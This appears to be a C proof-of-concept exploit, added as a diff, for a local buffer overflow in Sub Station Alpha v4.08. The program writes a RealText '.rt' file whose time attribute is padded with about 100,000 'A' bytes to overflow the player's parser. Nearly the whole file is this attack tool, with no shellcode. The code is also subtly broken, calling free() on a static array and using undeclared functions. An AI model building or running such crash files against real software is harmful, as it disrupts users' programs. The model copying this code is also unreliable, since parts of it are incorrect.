@@ -1,0 +1,100 @@
+/*Sub Station Alpha v4.08 .rt file local buffer overflow poc
+     by fl0 fl0w*/
+#include <string.h>
+#include <stdio.h>
+
+#define FIL3 "testfile.rt"
+   char header[]=
+   {
+             "\x3C\x77\x69\x6E\x64\x6F\x77\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x32\x35\x30\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x33\x30"
+             "\x30\x22\x20\x64\x75\x72\x61\x74\x69\x6F\x6E\x3D\x22\x31\x35\x22\x20\x62\x67\x63\x6F\x6C\x6F\x72\x3D\x22\x79\x65\x6C\x6C"
+             "\x6F\x77\x22\x3E\x0D\x0A\x4D\x61\x72\x79\x20\x68\x61\x64\x20\x61\x20\x6C\x69\x74\x74\x6C\x65\x20\x6C\x61\x6D\x62\x2C\x0D"
+             "\x0A\x3C\x62\x72\x2F\x3E\x3C\x74\x69\x6D\x65\x20\x62\x65\x67\x69\x6E\x3D\x22"     //header 109 bytes
+   };        
+   char tail[]=
+   {   
+            //junk
+            "\x22\x2F\x3E\x0D\x0A\x3C\x62\x72\x2F\x3E\x3C\x74\x69\x6D\x65\x20\x62\x65\x67\x69\x6E\x3D\x22\x36\x22\x2F\x3E\x6C\x69\x74"
+            "\x74\x6C\x65\x20\x6C\x61\x6D\x62\x2C\x0D\x0A\x3C\x62\x72\x2F\x3E\x3C\x74\x69\x6D\x65\x20\x62\x65\x67\x69\x6E\x3D\x22\x39"
+            "\x22\x2F\x3E\x4D\x61\x72\x79\x20\x68\x61\x64\x20\x61\x20\x6C\x69\x74\x74\x6C\x65\x20\x6C\x61\x6D\x62\x0D\x0A\x3C\x62\x72"
+            "\x2F\x3E\x3C\x74\x69\x6D\x65\x20\x62\x65\x67\x69\x6E\x3D\x22\x31\x32\x22\x2F\x3E\x77\x68\x6F\x73\x65\x20\x66\x6C\x65\x65"
+            "\x63\x65\x20\x77\x61\x73\x20\x77\x68\x69\x74\x65\x20\x61\x73\x20\x73\x6E\x6F\x77\x2E\x0D\x0A\x3C\x2F\x77\x69\x6E\x64\x6F"
+            "\x77\x3E\x0D\x0A"    //tail 154 bytes
+   };      
+   char banner[]=
+   {
+            "***********************************************************\n"
+            "Sub Station Alpha v4.08 .rt file local buffer overflow poc*\n"
+            "     by fl0 fl0w                                          *\n"
+            "***********************************************************\n"
+   };      
+/*--------prototypes------*/  
+   int cpy(char*,char*,int);
+   int cpystr(char*,int,int,int);
+   void print(char*);
+   unsigned int getFsize(FILE*,char*);
+/*-----extern var--------*/
+   char b[1000000];  
+   char *size;  
+   char junk[1000000];
+/*--------main---------------*/
+    int main()
+    {   
+        printf("%s",banner);
+        print("Starting sploit");
+        memset(junk,0x41,99999);
+         buildf(FIL3);
+          print("File done!");
+          getchar();
+          return 0;
+    }             
+  int buildf(char* fname)
+  {
+      FILE* fp=fopen(fname,"wb");
+        
+      if(fp==NULL)
+      {
+         print("File writing error"); 
+         exit(0);
+      }   
+      fprintf(fp,"%s%s%s",header,junk,tail);
+      printf("[!]File is %d bytes",getFsize(fp,FIL3));
+      fclose(fp);
+      free(b);
+              
+      return 0;  
+  }   
+   unsigned int getFsize(FILE* g,char* gname)
+   {
+            unsigned int s;
+            
+             g=fopen(gname,"rb");
+              
+             if(g==NULL)
+             {
+             print("File error at reading");
+             exit(0);
+             }            
+             fseek(g,0,SEEK_END);
+             s=ftell(g);
+             
+            return s;
+   }   
+   int cpy(char* source,char* dest,int offset)
+   {
+     int len;
+     len=strlen(source);
+     memcpy(dest+offset,source,len+1);
+     
+     return len;
+   } 
+   int cpystr(char* dest,int str,int len,int offset)
+  {
+      memset(dest+offset,str,len+1);
+      return len; 
+  }     
+   void print(char* msg)
+   {
+     printf("\n[*]%s\n",msg);
+   }
+             
